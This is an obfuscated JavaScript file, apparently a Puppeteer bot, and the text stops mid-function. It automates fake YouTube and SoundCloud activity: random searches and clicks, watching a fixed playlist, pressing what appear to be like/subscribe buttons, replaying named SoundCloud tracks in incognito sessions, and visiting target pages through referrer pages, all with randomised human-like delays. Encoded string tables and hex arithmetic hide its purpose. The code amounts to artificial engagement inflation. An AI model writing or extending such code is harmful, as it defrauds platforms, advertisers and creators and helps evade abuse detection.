const X = b,
  W = d,
  V = c;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x29 * -0xa3 + 0x2 * 0x1147 + -0x3ca9);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xd * -0x1ad + -0xdf * 0x16 + 0x28f4))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1bb * 0xf + -0x1d * 0x49 + 0x2a2 * 0xd), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x5c10 + -0x57b * 0x2 + 0x2 * 0x120b + (-0x6db * -0xe + 0x1e39 * -0x1 + 0x2f * -0x27) * random()) : await standardWaitForNetIdle(f), await wait(-0x1864 + -0x2 * -0x1af + 0x288e + (0x1a5 * -0xa + 0x125b * -0x2 + 0x5c38) * random()), -0x141 * -0x1b + 0x1a2e + -0x3c08;
}

function a() {
  const bo = [
    'WOOpdhe',
    'CMXHW43dGmoHlCo7A8of',
    'Ahr0Chm6lY9NCG',
    'W7m8WR/cUSoHCmofW49ZWPu',
    'AxnnB29TB29jBW',
    'Ct0WlJK',
    'W6ZdM8kQqmk5W7xdKa',
    'zwfZEwzVCMSUBW',
    'BNDerv9dufLInG',
    'nhGGpIbKAxyUzG',
    'ixxcGmouWRZcNH7cMCk7WOG',
    'n8oskrFcUCoygv7cHCkq',
    'W4FcIdGEW47cR8ksWPRdM8kn',
    'ace',
    '\x20beast\x20hin',
    'W4JdVCkQaLKbW6NcNuJdSW',
    'mwy4C1u0BdnKua',
    'WQqRWPOLW4tdLu4izmk8',
    'rwfNBgu',
    'CMCVC2nYAxb0CW',
    'v2yoFxrrtGVcJge',
    'Aw4TEw91CI1JCW',
    'obal-name-',
    'alexey.ink',
    'easyfork.o',
    'W4CKCSk6fwhcGq3cHmk8',
    'yMXVy2S',
    'nKLTwMr3Cgr3va',
    '\x20Chrome/10',
    '-play-butt',
    'nLDVC3fnCtLLAG',
    '8.0.0.0\x20Sa',
    'xplains'
  ];
  a = function() {
    return bo;
  };
  return a();
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x951 + 0x3 * 0x623 + -0x2 * -0x538), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x2 * 0x584 + 0x1d6f + -0x1266;
}
async function randomWait() {
  return await wait(-0x2210 + -0x949 + 0x3ee1 + (-0x48f * 0x2 + -0x16 * -0x9b + 0x28e * 0x6) * random()), 0x59 * 0x2f + -0x3a5 * -0x3 + -0x1b45;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1cf2 + 0xfbc + -0x2cae, 0x1484 + -0xc22 + 0x85b * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x7fc6 * 0x3 + 0x1 * -0x2be5 + -0x690d) * getRandomInt(-0x20b7 + -0x7 * 0x515 + -0x5e * -0xba, 0x228e * -0x1 + 0x94 * -0x16 + 0x1 * 0x2f4b), h)), 0x1a72 + 0x1 * 0x681 + -0x20f2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x356 * -0x2 + 0x121 + 0x58b;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x26f9 + 0x140c * -0x1 + 0x3b06]['split']('\x20');
    for (let k = 0x2 * -0x114b + 0x23b4 + -0x11e; k < i['length']; k += -0xb * -0x337 + -0xf82 + -0x13d9)
      j += i[k] * h[i[k + (0xa31 * -0x3 + 0x134b * -0x2 + 0x452a)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x919 * -0x3 + 0x2 * 0x6c3 + 0xdcb)['map'](l => Array['from'](l['children']))['flat'](0xee5 * -0x2 + 0x715 + 0xab * 0x22)['map'](l => l['childNodes'][0x82 * 0x3d + -0x205b + -0x76 * -0x3]['childNodes'][-0xfdf * -0x1 + -0x106f + -0x3 * -0x30]['childNodes'][0x2f + -0x1 * 0xcb1 + 0xc83 * 0x1]['childNodes'][0x1 * -0x231f + 0x1bc3 + 0x4 * 0x1d7]['childNodes'][0x18d2 + -0x7fa * 0x4 + -0x3 * -0x25d]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x22c1 + -0x15e5 + -0xbf * 0xc, -0x8dd * 0x1 + -0x268e + 0x42f3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x170f * -0x3 + 0x22f * 0x24 + -0x3 * -0x1063);
  const h = await getMaxTime(f),
    i = Math['min']((0x683f * 0x1 + -0x13 * -0xdb8 + -0x8287) * getRandomInt(0x35c + -0x95f + -0x17 * -0x43, 0x1b93 + -0x175 * -0x11 + -0x3453), h);
  return await wait(i), 0x1e95 + 0x1b1a + 0x282 * -0x17;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x15ed + 0x1139 + 0x4b4]['children'][0x454 + -0x2400 * -0x1 + -0x3a * 0xb2]['children'][0x247c + 0xa6 * 0x39 + 0x4f * -0xee]['children'][0x1b52 + 0x18 * 0xeb + -0x315a]['children'][0x3c7 + 0x1a4c + -0x1 * 0x1e13]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x22c7 + -0x754 * 0x1 + 0x2a1c;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x2e6 + 0x1852 + 0x65 * -0x44 + (0x1831 * -0x1 + 0xd * -0x298 + 0x3a1b) * random()
  }), await wait(0x2 * -0x137e + -0x26f * 0x3 + 0xe9 * 0x35 + (-0x290 * 0x6 + 0x99d + 0x6ef) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x4a6 + 0x2a5 * -0xc + -0x89 * -0x44]['childNodes'][-0x244a * -0x1 + 0x8f1 + -0x2d3a]['childNodes'][0x241f + -0xa83 + 0x17 * -0x11d]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xa36 * -0x2 + 0x1418 + 0x59]['childNodes'][0x1772 * -0x1 + -0x4 * -0x55a + 0x20a]['childNodes'][-0x712 + 0x10 * -0x21f + 0x2904]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xb57 + -0x83f * 0x1 + -0x7 * 0x71),
          r = -0x2439 + -0x160c + -0x3a45 * -0x1;
        for (let u = 0xb3a * -0x1 + -0x1 * 0x1db4 + 0x2 * 0x1477; u < q['length']; u += 0x23 * -0xd9 + -0x8bd * 0x2 + 0x2f27)
          r += q[u] * k[q[u + (-0x22 * 0xf1 + 0x2025 + -0x22)]];
        return r;
      }(n);
  });
  await wait((-0x856 * 0xc + 0x30e3 * 0x1 + 0xd * 0x871) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x16 * -0x1527 + -0x19f1c + -0x1 * -0x45ad6) * getRandomInt(-0x1 * -0x15e4 + -0xaf8 + -0xaeb, -0x1 * -0x1768 + -0x12a6 + -0x4b8), h + (0x19 * -0xe6 + 0x5 * -0x289 + 0xf * 0x3a5));
  return await wait(i), 0xac8 + -0x1 * 0x1b62 + -0x1 * -0x109b;
}
async function keyWatch(f) {
  const R = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + R(0x8) + 'aBUkYyfi-y'), 0x1140 + 0x148 + -0x1288), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const S = d;
        document['querySelec' + 'tor']('.ytp-large' + S(0x1d) + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xc17 + 0x17ef + 0x1 * -0x20 + (0xf4a * -0x1 + -0x1 * -0x222b + 0xef9 * -0x1) * Math['random']());
    });
  }, 0x1f94 + 0x1403 + 0x3 * -0x815);
  await wait(-0x7e34f + 0x2 * 0x16910 + 0x9a50f);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xb941 + 0x6858 + 0x13b49) * getRandomInt(0x25ac + -0x1 * 0xc56 + -0x1952, 0x1fb7 + 0x26f7 + 0x1787 * -0x3)), clearInterval(h), -0x128f * 0x1 + -0x2698 + 0x3e * 0xec;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2 * -0xac1 + -0x1b45 + 0x30c7 * 0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x2426 + -0x1 * -0x405 + -0x282a;
    await randomWait();
  }
  return 0x232 * -0x6 + -0x19ba + 0x26e7;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1436 + -0x17d3 * 0x1 + -0x1 * -0x2c09 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x9f6 + -0x1c09 + 0x25ff + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x29 * -0xa3 + 0x2 * 0x1147 + -0x3ca9);
    let h = e[f];
    if (b['kXsmgk'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x328 + -0x1 * -0x1d95 + -0x20bd, s, t, u = -0x12c1 + 0x1 * -0x1f85 + 0x3246; t = n['charAt'](u++); ~t && (s = r % (0xdf * -0x16 + 0xf04 + 0x42a) ? s * (-0x1bb * 0xf + -0x1d * 0x49 + 0xb7e * 0x3) + t : t, r++ % (0xf58 + -0x4e * 0x6 + 0x9 * -0x180)) ? p += String['fromCharCode'](-0x333 * -0xa + 0xa13 * -0x1 + 0x67 * -0x34 & s >> (-(-0x1864 + -0x2 * -0x1af + 0x1508) * r & 0x1a5 * -0x5 + 0x125b * -0x1 + 0x1a9a)) : -0x141 * -0x1b + 0x1a2e + -0x3c09) {
          t = o['indexOf'](t);
        }
        for (let v = -0x951 + 0x3 * 0x623 + -0x2 * 0x48c, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x2 * 0x584 + 0x1d6f + -0x1257))['slice'](-(-0x2210 + -0x949 + 0x2b5b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x48f * 0x2 + -0x16 * -0x9b + 0x21a * -0x2,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x59 * 0x2f + -0x3a5 * -0x3 + -0x1b46; u < 0x1cf2 + 0xfbc + -0x2bae; u++) {
          p[u] = u;
        }
        for (u = 0x1484 + -0xc22 + 0x862 * -0x1; u < 0xaa6 * 0x3 + 0x4 * -0xea + -0x1b4a; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x20b7 + -0x7 * 0x515 + -0x62 * -0xb5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x228e * -0x1 + 0x94 * -0x16 + 0x2 * 0x17a3, q = 0x1a72 + 0x1 * 0x681 + -0x20f3;
        for (let v = 0x356 * -0x2 + 0x121 + 0x58b; v < n['length']; v++) {
          u = (u + (-0x26f9 + 0x140c * -0x1 + 0x3b06)) % (0x2 * -0x114b + 0x23b4 + -0x1e), q = (q + p[u]) % (-0xb * -0x337 + -0xf82 + -0x12db), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xa31 * -0x3 + 0x134b * -0x2 + 0x4629)]);
        }
        return t;
      };
      b['OotVso'] = m, c = arguments, b['kXsmgk'] = !![];
    }
    const j = e[0x919 * -0x3 + 0x2 * 0x6c3 + 0xdc5],
      k = f + j,
      l = c[k];
    return !l ? (b['CqwWRR'] === undefined && (b['CqwWRR'] = !![]), h = b['OotVso'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x17 * 0xd9 + -0x1ade + -0x8f * -0x53 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x2 * -0x90a + 0x4 * 0x4b2 + -0xb4;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + T(0x9) + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xb1 * 0x1be + -0x1 * 0x2478 + 0x2089e + getRandomInt(-0x1 * -0x1873 + -0x54e7 + 0x4c * 0x191, 0xb9b7 + -0x3567 * 0x2 + 0x2647 * 0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x251d * 0x1 + -0x3 * -0x66d + -0x5 * 0xb47), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xde + 0x56 * -0x1c + -0xa46 * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1 * 0x1735 + 0x4fb * 0x4 + -0x1 * 0x2b21, -0x5 * -0x392 + -0x7 * 0x333 + 0x4bd)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x83 * -0x27 + -0xd * 0x1fd + 0xdb4 + floor((-0x36c + -0x250 * -0x5 + -0x43c) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x52b3 * -0x31332 + 0x55cacd8c + -0x1d * 0x7503fea),
          -0x3cdb37 * 0x2 + 0x1 * -0x6d2417 + -0x9b2e1 * -0x25,
          0x11a * -0x4d + -0xb6eb + 0x1 * 0x18bbd,
          -0x1917 * 0x1 + -0x11e6 + -0x3 * -0xe7f
        ], y = [
          0x60f * 0x2 + -0x9cc + -0x23a,
          0x11 * 0x1e6 + 0x1588 + -0x35be,
          0x41e + 0x767 + -0xb7d,
          -0x93e + -0x198c + 0x2 * 0x1165
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0xd * -0x10a + 0x2055 + -0x16eb * 0x2)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * 0x5d + -0x2244 + 0x21e7; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1 * -0x4ed + 0x4cc + 0x21) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0xa23 + -0x6b8 + -0x36b * 0x1] = A[-0x1 * -0x23ad + -0x1c97 + 0x1f * -0x3a] = A[0x167 * -0x1 + -0x24ea + 0x2652] = A[0xc03 + 0x119 * 0x14 + -0x21f5] = A[0x1 * -0x23ad + 0x1898 + -0xa * -0x11c] = A[-0x251 + 0x92f * 0x2 + 0x1 * -0x1009] = A[0x269 * 0x7 + 0x1 * -0x1b82 + 0xaa8] = A[-0x2b * -0xbc + -0x1 * -0xa1d + -0x29ab] = A[-0x14 + -0x1dc1 * 0x1 + 0x1ddc] = A[0x2 * 0xfd6 + 0xa3b + -0x18d * 0x1b] = A[0x1e36 + 0x1527 * 0x1 + -0x3354] = A[0x21a6 + 0x160 + -0x22fc] = A[-0x7a1 + -0x155 + 0x5 * 0x1cd] = A[-0x1fd9 + -0x1f88 + 0x3f6d] = A[-0x19b1 * -0x1 + -0x4ac + -0x14f8] = A[0x21ee + -0x3 * -0xb1b + -0x4331] = A[0x193 * -0x4 + -0xe4a + 0x1 * 0x14a5] = 0xda2 + -0xf20 + 0x17e, this['blocks'] = A) : this['blocks'] = [
                0x9f7 + -0x1 * 0xdc4 + -0x7 * -0x8b,
                -0x4b0 + -0x2606 + 0x2ab6,
                0x26d5 + -0x230a + 0x3cb * -0x1,
                0x89b + 0x1be7 + -0x2482 * 0x1,
                -0x11 * -0xc + -0x236c + 0x22a0,
                0x1e65 + -0x1 * -0x6fb + -0x2560,
                0x150c + -0xb3 * -0x25 + -0x1 * 0x2eeb,
                -0x1e6b + -0x1e1c + -0x142d * -0x3,
                -0x26 * -0x8b + -0x14 * 0xca + -0x4da,
                -0x24c1 + -0xc48 + 0x3109,
                -0xa * 0x11b + -0x3 * 0x68 + 0xc46,
                0x2386 + 0x1 * 0x1baa + 0x18 * -0x2a2,
                -0x2 * -0xd1 + -0x2222 + -0x1a * -0x140,
                -0x1a * 0x36 + 0x4 * -0x99f + 0x2bf8,
                -0xb33 + -0x1a83 + 0x25b6,
                -0x15cc + 0x7 * 0x36f + -0x23d,
                -0x1e4 * -0x6 + 0xcae + -0xf6 * 0x19
              ], this['h0'] = 0x791f73 * -0x5e + 0x40bca911 + 0x5302062a, this['h1'] = 0xc08ba91d * 0x2 + -0x128cc8d * -0x151 + 0x1 * -0x217feec4e, this['h2'] = 0xa498a3e * 0x4 + 0x1 * -0xb6615977 + 0x10a3 * 0x11ab5f, this['h3'] = -0x5996086 + -0x1c20d671 + 0x1 * 0x31ec8b6d, this['h4'] = 0x1ae90d26 + 0x18 * -0xeb2f8fe + 0x209b12c9a, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xa87 + 0xebe + 0x1945 * -0x1, this['finalized'] = this['hashed'] = 0x33 * 0x2 + 0x8bf * 0x2 + -0x11e4, this['first'] = 0x409 + 0x25ef + -0xdfd * 0x3;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x265f + 0x11de + -0x383d, O = J['length'] || 0x7 * 0x35f + -0xa9e + -0xcfb, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * -0x1d62 + -0x2351 + 0x5ef, P[-0x25f3 + 0xb11 + 0x1ae2] = this['block'], P[0x339 + -0x1 * -0x19be + 0x421 * -0x7] = P[-0x62 * 0x11 + -0x1 * 0x1330 + 0x19b3] = P[-0x1 * 0x20e3 + -0x86a + 0x294f] = P[-0x17cc + 0x164b + 0x184 * 0x1] = P[-0x526 * -0x7 + -0x1843 * -0x1 + 0x3d * -0xfd] = P[0x25d8 + -0xd19 + -0x18ba] = P[-0x21c1 + 0x25a6 + -0x3df] = P[0x637 * -0x4 + 0x1b28 + -0x245] = P[0x2235 + -0x5 * 0x713 + 0x132] = P[0x1dbf * -0x1 + -0x445 * 0x2 + -0xda * -0x2d] = P[0xe89 + -0x14f * 0x9 + -0x4 * 0xae] = P[0x1 * -0x1957 + 0x1198 * -0x1 + 0x2afa] = P[0x1 * -0x1337 + 0x2682 + -0x133f] = P[-0x1 * -0x10ea + 0x14b9 * -0x1 + 0x3dc] = P[0x25ed + 0x22a * -0x9 + -0x1265] = P[-0xbca + 0xea8 * -0x2 + 0x2929] = 0x2 * 0x88f + 0x237f + -0x349d), K) {
                    for (N = this['start']; M < O && N < -0x1869 + -0x2ca * -0xc + -0x8cf; ++M)
                      P[N >> -0x2 * 0xb7b + 0x16d0 + 0x4 * 0xa] |= J[M] << y[0x1021 + -0x5 * -0x50d + -0x295f & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xf * -0x7a + -0xb2c + 0x223 * 0x2; ++M)
                      (L = J['charCodeAt'](M)) < 0x1 * 0x1c1 + -0x6ad + 0x56c ? P[N >> 0x1b7c + 0xc26 + -0x8 * 0x4f4] |= L << y[0x1 * 0x1183 + -0x76f * 0x3 + 0x4cd & N++] : L < 0x10e9 + 0xfed + -0xc6b * 0x2 ? (P[N >> 0x5cb * -0x1 + -0x7d * -0x1b + -0x762] |= (0x158f + 0x1 * 0x911 + -0x10 * 0x1de | L >> -0x246a + -0x23ac + -0x34 * -0x163) << y[-0x133 * 0x11 + 0x1f75 + 0xb0f * -0x1 & N++], P[N >> -0xd * 0x1cf + -0x2256 + 0x39db] |= (-0x2267 + 0xde7 * -0x1 + 0x30ce | 0x1cac + 0x17f7 + -0x2 * 0x1a32 & L) << y[-0x1 * 0x5d1 + -0x1 * -0x1c13 + -0x11 * 0x14f & N++]) : L < 0x7e9b * -0x1 + -0x13 * -0x71e + 0xcf61 || L >= -0x10b * 0x117 + -0x2 * -0x3125 + -0x1a0b3 * -0x1 ? (P[N >> -0x7ad + -0x136 + 0x8e5] |= (-0xcf5 + -0x8 * 0x28c + 0x2235 | L >> 0x15cc + -0x47 * 0x7 + -0xb * 0x1cd) << y[-0x2b * 0x59 + 0x14ec + 0x2 * -0x2fb & N++], P[N >> -0x2 * 0x1106 + 0x1 * -0x14fe + 0x43c * 0xd] |= (0x8 * -0x1a5 + -0x505 + 0x2ab * 0x7 | L >> -0x18a0 + 0x21 * -0x1a + 0x400 * 0x7 & -0x1 * 0x183b + 0x42c + -0xe2 * -0x17) << y[-0x269d + 0x8d1 + 0x1 * 0x1dcf & N++], P[N >> -0x19f7 + -0x15 * -0xe9 + 0x2 * 0x36e] |= (-0x94b * 0x1 + -0xe69 + 0x1834 | -0x23 * -0x3 + -0x18e2 + -0x7 * -0x388 & L) << y[-0x134d + -0xb05 + 0x1e55 & N++]) : (L = 0x1a6b6 * 0x1 + -0x6168 + 0x1 * -0x454e + ((0x19df + -0x1f6 * -0xa + 0x5a * -0x76 & L) << 0x98c + -0x25b * 0x4 + -0x2 * 0xb | 0x1 * 0x1b43 + 0x1 * 0x2038 + 0x4 * -0xddf & J['charCodeAt'](++M)), P[N >> 0x1 * -0x2033 + -0x16e5 + -0x2 * -0x1b8d] |= (0x1636 + -0x2190 + 0xc4a | L >> -0xa1d * -0x1 + 0x1 * 0x1075 + -0x1a80) << y[0x14b8 + -0xd06 + -0x119 * 0x7 & N++], P[N >> -0x22f8 + -0x1cfb + -0x3ff5 * -0x1] |= (0x1 * 0xca5 + 0x1525 * 0x1 + 0x10a5 * -0x2 | L >> 0x12b * -0x6 + 0x1e66 * 0x1 + -0x1758 & -0x267f + -0x1022 * -0x2 + -0x67a * -0x1) << y[-0x2160 + 0xa6e + -0x3 * -0x7a7 & N++], P[N >> 0x2f * -0x22 + -0x2388 + 0x29c8] |= (0xe2d * 0x2 + -0x407 * -0x7 + 0x1 * -0x380b | L >> 0x1ab7 + 0x1 * -0x16f + -0x1942 & -0x21d9 + 0x1 * 0xe59 + -0x695 * -0x3) << y[0x238 + -0x2394 + -0x1 * -0x215f & N++], P[N >> -0x127 * -0x14 + 0x422 * 0x3 + -0x2370] |= (-0x1b08 * 0x1 + -0x19d + 0x1d25 * 0x1 | 0x281 * 0x3 + 0x1 * 0x1bb6 + -0x22fa & L) << y[-0x20ae + -0x13af + -0x4 * -0xd18 & N++]);
                  }
